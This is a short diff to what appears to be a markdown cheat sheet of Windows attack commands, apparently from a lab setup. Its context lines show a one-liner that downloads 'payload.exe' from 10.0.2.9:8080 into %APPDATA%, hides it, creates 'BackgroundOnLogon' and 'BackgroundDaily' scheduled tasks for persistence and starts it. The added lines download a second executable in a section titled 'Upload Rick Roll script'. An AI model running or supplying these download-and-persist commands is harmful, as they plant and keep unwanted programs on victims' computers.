@@ -33,3 +33,9 @@
 curl -o "%APPDATA%\background.exe" http://10.0.2.9:8080/payload.exe && attrib +h "%APPDATA%\background.exe" && schtasks /create /sc onlogon /tn "BackgroundOnLogon" /tr "\"%APPDATA%\background.exe\"" /f && schtasks /create /sc daily /st 10:00 /tn "BackgroundDaily" /tr "\"%APPDATA%\background.exe\"" /f && start "" "%APPDATA%\background.exe"
 ```
 - Create task scheduler `BackgroundOnLogon` and `BackgroundDaily`
+
+## Upload Rick Roll script
+
+```
+curl -o "%APPDATA%\program.exe" http://10.0.2.9:8080/wow.exe
+```
